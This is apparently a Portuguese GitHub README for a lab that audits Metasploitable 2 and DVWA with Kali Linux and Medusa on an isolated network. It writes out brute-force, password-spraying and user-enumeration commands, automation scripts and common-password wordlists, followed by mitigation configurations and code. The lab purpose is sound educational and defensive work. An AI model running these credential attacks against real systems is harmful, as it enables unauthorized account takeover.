# Auditoria de Segurança com Kali Linux e Medusa

## 📋 Sobre o Projeto

Este projeto documenta uma implementação completa de auditoria de segurança utilizando Kali Linux e a ferramenta Medusa em ambientes controlados. O objetivo é demonstrar vulnerabilidades comuns em sistemas e aplicar técnicas de prevenção e mitigação.

## 🎯 Objetivos

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- Utilizar Kali Linux e Medusa para auditoria de segurança
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades e propor medidas de mitigação
- Compartilhar conhecimento através de documentação técnica

## 🛠️ Tecnologias Utilizadas

- **Kali Linux** - Sistema operacional para testes de penetração
- **Medusa** - Ferramenta de auditoria de força bruta
- **Metasploitable 2** - Sistema intencionalmente vulnerável para testes
- **DVWA** - Damn Vulnerable Web Application
- **VirtualBox** - Virtualização do ambiente
- **Nmap** - Enumeração e escaneamento de rede

## 📁 Estrutura do Projeto

```
.
├── README.md
├── docs/
│   ├── configuracao-ambiente.md
│   ├── ataques-ftp.md
│   ├── ataques-web.md
│   └── ataques-smb.md
├── wordlists/
│   ├── usuarios.txt
│   ├── senhas-comuns.txt
│   └── passwords-top100.txt
├── scripts/
│   ├── enum-users.sh
│   ├── medusa-ftp.sh
│   └── medusa-smb.sh
└── images/
    ├── topologia-rede.png
    ├── scan-nmap.png
    └── evidencias/
```

## 🚀 Configuração do Ambiente

### Requisitos

- VirtualBox 6.0 ou superior
- Kali Linux (última versão)
- Metasploitable 2
- Mínimo 8GB RAM
- 50GB de espaço em disco

### Topologia de Rede

A rede foi configurada em modo **Host-Only** para isolar completamente o ambiente de testes:

- **Kali Linux**: 192.168.56.101
- **Metasploitable 2**: 192.168.56.102
- **Rede**: 192.168.56.0/24

### Instalação

```bash
# Atualizar sistema Kali Linux
sudo apt update && sudo apt upgrade -y

# Instalar Medusa
sudo apt install medusa -y

# Instalar ferramentas adicionais
sudo apt install nmap hydra enum4linux -y

# Verificar instalação
medusa -V
```

## 🔍 Cenários de Auditoria

### 1. Ataque de Força Bruta em FTP

**Objetivo**: Testar credenciais fracas no serviço FTP

**Enumeração Inicial**:
```bash
# Scan de portas
nmap -sV -p 21 192.168.56.102

# Detecção de serviço
nmap -sC -sV -p 21 192.168.56.102
```

**Execução do Ataque**:
```bash
# Ataque com usuário conhecido
medusa -h 192.168.56.102 -u msfadmin -P wordlists/senhas-comuns.txt -M ftp

# Ataque com múltiplos usuários
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas-comuns.txt -M ftp -t 4

# Com verbose para análise detalhada
medusa -h 192.168.56.102 -u msfadmin -P wordlists/senhas-comuns.txt -M ftp -v 6
```

**Resultado Esperado**:
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validação**:
```bash
# Testar acesso
ftp 192.168.56.102
# Usuario: msfadmin
# Senha: msfadmin
```

### 2. Ataque em Aplicação Web (DVWA)

**Configuração do DVWA**:
1. Acessar http://192.168.56.102/dvwa
2. Configurar nível de segurança: Low
3. Acessar página de login brute force

**Enumeração**:
```bash
# Identificar parâmetros do formulário
curl -v http://192.168.56.102/dvwa/vulnerabilities/brute/

# Analisar estrutura da requisição
burpsuite # (opcional para análise mais detalhada)
```

**Execução do Ataque**:
```bash
# Ataque ao formulário web
medusa -h 192.168.56.102 -u admin -P wordlists/passwords-top100.txt -M web-form \
  -m FORM:"/dvwa/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect"

# Alternativa com Hydra para comparação
hydra -l admin -P wordlists/passwords-top100.txt 192.168.56.102 http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
```

**Resultado**:
```
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

### 3. Password Spraying em SMB

**Enumeração de Usuários**:
```bash
# Enumerar usuários do sistema
enum4linux -U 192.168.56.102

# Usando Nmap NSE
nmap --script smb-enum-users -p 445 192.168.56.102

# Manual via rpcclient
rpcclient -U "" -N 192.168.56.102 -c "enumdomusers"
```

**Criação de Wordlist de Usuários**:
```bash
# Salvar usuários enumerados
cat > wordlists/usuarios.txt << EOF
root
msfadmin
user
service
postgres
sys
EOF
```

**Password Spraying**:
```bash
# Testar senha comum em múltiplos usuários
medusa -H wordlists/usuarios.txt -p password -M smbnt -h 192.168.56.102

# Testar múltiplas senhas (evitando lockout)
medusa -U wordlists/usuarios.txt -P wordlists/senhas-comuns.txt -M smbnt \
  -h 192.168.56.102 -t 1 -T 5
```

**Validação**:
```bash
# Testar acesso SMB
smbclient -L \\\\192.168.56.102 -U msfadmin
# Senha: msfadmin

# Acessar compartilhamento
smbclient \\\\192.168.56.102\\tmp -U msfadmin
```

## 📊 Resultados e Análise

### Vulnerabilidades Identificadas

| Serviço | Vulnerabilidade | Severidade | CVSS Score |
|---------|----------------|------------|------------|
| FTP | Credenciais fracas (msfadmin:msfadmin) | Crítica | 9.8 |
| HTTP | Login sem proteção contra brute force | Alta | 7.5 |
| SMB | Múltiplas contas com senhas padrão | Crítica | 9.1 |
| SSH | Permissão de login root direto | Alta | 8.1 |

### Tempo de Quebra de Senhas

```
Senha de 4 caracteres (lowercase): ~2 minutos
Senha de 6 caracteres (alfanumérica): ~30 minutos
Senha de 8 caracteres (complexa): ~48 horas
Senha de 10+ caracteres (complexa): Inviável
```

## 🛡️ Medidas de Mitigação

### Para Administradores de Sistema

#### 1. Políticas de Senha Fortes
```bash
# Configurar complexidade no Linux (PAM)
sudo vim /etc/pam.d/common-password

# Adicionar linha:
password requisite pam_pwquality.so retry=3 minlen=12 difok=3 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1

# Política de expiração
sudo vim /etc/login.defs
PASS_MAX_DAYS   90
PASS_MIN_DAYS   1
PASS_WARN_AGE   7
```

#### 2. Proteção contra Força Bruta

**Fail2Ban no FTP/SSH**:
```bash
# Instalar Fail2Ban
sudo apt install fail2ban -y

# Configurar jail para FTP
sudo vim /etc/fail2ban/jail.local

[vsftpd]
enabled = true
port = ftp,21
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600
```

**Rate Limiting no Web Server**:
```apache
# Apache mod_evasive
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 5
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 600
</IfModule>
```

#### 3. Autenticação Multifator (MFA)

```bash
# Instalar Google Authenticator para SSH
sudo apt install libpam-google-authenticator -y

# Configurar PAM
sudo vim /etc/pam.d/sshd
# Adicionar: auth required pam_google_authenticator.so

# Configurar SSHD
sudo vim /etc/ssh/sshd_config
ChallengeResponseAuthentication yes
AuthenticationMethods publickey,keyboard-interactive
```

#### 4. Monitoramento e Logs

```bash
# Monitorar tentativas de login
sudo tail -f /var/log/auth.log | grep Failed

# Analisar tentativas de força bruta
sudo lastb | head -20

# Script de alerta
#!/bin/bash
THRESHOLD=5
COUNT=$(grep "Failed password" /var/log/auth.log | grep "$(date +%b\ %d)" | wc -l)
if [ $COUNT -gt $THRESHOLD ]; then
    echo "ALERTA: $COUNT tentativas de login falhadas detectadas!" | mail -s "Segurança" admin@exemplo.com
fi
```

#### 5. Configurações Específicas por Serviço

**FTP (vsftpd)**:
```bash
# /etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES
max_clients=10
max_per_ip=2
```

**SMB (Samba)**:
```bash
# /etc/samba/smb.conf
[global]
   security = user
   encrypt passwords = yes
   min protocol = SMB3
   server signing = mandatory
   restrict anonymous = 2
```

**SSH**:
```bash
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 60
```

### Para Desenvolvedores

#### 1. Implementar CAPTCHA
```php
// Exemplo com reCAPTCHA v3
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $recaptcha_secret = 'YOUR_SECRET_KEY';
    $recaptcha_response = $_POST['g-recaptcha-response'];
    
    $verify = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret={$recaptcha_secret}&response={$recaptcha_response}");
    $response = json_decode($verify);
    
    if ($response->success && $response->score > 0.5) {
        // Processar login
    }
}
```

#### 2. Rate Limiting na Aplicação
```python
# Exemplo em Python Flask
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # Lógica de login
    pass
```

#### 3. Lockout Temporário
```javascript
// Node.js com Express
const loginAttempts = new Map();

app.post('/login', (req, res) => {
    const ip = req.ip;
    const attempts = loginAttempts.get(ip) || { count: 0, lockoutUntil: null };
    
    if (attempts.lockoutUntil && Date.now() < attempts.lockoutUntil) {
        return res.status(429).json({ error: 'Conta temporariamente bloqueada' });
    }
    
    // Verificar credenciais
    if (!validCredentials) {
        attempts.count++;
        if (attempts.count >= 5) {
            attempts.lockoutUntil = Date.now() + (15 * 60 * 1000); // 15 minutos
        }
        loginAttempts.set(ip, attempts);
        return res.status(401).json({ error: 'Credenciais inválidas' });
    }
    
    // Login bem-sucedido
    loginAttempts.delete(ip);
});
```

## 📚 Wordlists Utilizadas

### usuarios.txt
```
root
admin
user
msfadmin
service
postgres
sys
test
guest
```

### senhas-comuns.txt
```
123456
password
admin
root
msfadmin
qwerty
123456789
letmein
welcome
monkey
```

### passwords-top100.txt
Lista com as 100 senhas mais comuns mundialmente (incluída no repositório).

## 🔧 Scripts de Automação

### enum-users.sh
```bash
#!/bin/bash

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <IP_ALVO>"
    exit 1
fi

echo "[+] Enumerando usuários em $TARGET"
echo ""

echo "[*] Tentando enum4linux..."
enum4linux -U $TARGET | grep "user:" | cut -d "[" -f2 | cut -d "]" -f1

echo ""
echo "[*] Tentando RPC..."
rpcclient -U "" -N $TARGET -c "enumdomusers" 2>/dev/null

echo ""
echo "[+] Enumeração concluída"
```

### medusa-ftp.sh
```bash
#!/bin/bash

TARGET=$1
USER_LIST=$2
PASS_LIST=$3

if [ $# -lt 3 ]; then
    echo "Uso: $0 <IP_ALVO> <LISTA_USUARIOS> <LISTA_SENHAS>"
    exit 1
fi

echo "[+] Iniciando auditoria FTP em $TARGET"
echo "[*] Usuários: $USER_LIST"
echo "[*] Senhas: $PASS_LIST"
echo ""

medusa -h $TARGET -U $USER_LIST -P $PASS_LIST -M ftp -t 4 -v 4 -O resultado-ftp.txt

echo ""
echo "[+] Resultados salvos em resultado-ftp.txt"
```

## 📖 Conceitos Aprendidos

### 1. Ataques de Força Bruta
Técnica que tenta sistematicamente todas as possíveis combinações de senhas até encontrar a correta. Eficaz contra senhas fracas, mas tempo de execução cresce exponencialmente com a complexidade.

### 2. Password Spraying
Variação mais sigilosa onde tenta-se poucas senhas comuns em muitos usuários, evitando políticas de bloqueio por tentativas.

### 3. Enumeração de Usuários
Processo de descobrir usuários válidos no sistema, frequentemente primeiro passo antes de ataques de credenciais.

### 4. Defesa em Profundidade
Múltiplas camadas de segurança (senhas fortes + MFA + rate limiting + monitoramento) são mais eficazes que uma única medida.

## 🎓 Referências e Recursos

- [Kali Linux Documentation](https://www.kali.org/docs/)
- [Medusa Official Documentation](http://foofus.net/goons/jmk/medusa/medusa.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Metasploitable 2 Guide](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/)

## ⚠️ Avisos Legais

**IMPORTANTE**: Este projeto foi desenvolvido exclusivamente para fins educacionais em ambiente controlado e isolado.

- ✅ **Permitido**: Testes em sistemas próprios ou com autorização explícita
- ❌ **Proibido**: Uso contra sistemas sem autorização (crime previsto em lei)
- 📜 **Legislação**: Lei nº 12.737/2012 (Lei Carolina Dieckmann) - Invasão de dispositivo informático

**Você é responsável pelo uso ético e legal das técnicas apresentadas.**

## 🤝 Contribuições

Contribuições são bem-vindas! Sinta-se à vontade para:

1. Fazer fork do projeto
2. Criar uma branch para sua feature (`git checkout -b feature/NovaFuncionalidade`)
3. Commit suas mudanças (`git commit -m 'Adiciona nova funcionalidade'`)
4. Push para a branch (`git push origin feature/NovaFuncionalidade`)
5. Abrir um Pull Request

## 📧 Contato

Para dúvidas, sugestões ou discussões sobre segurança da informação, entre em contato através das issues do GitHub.

## 📄 Licença

Este projeto está sob a licença MIT. Veja o arquivo `LICENSE` para mais detalhes.

---
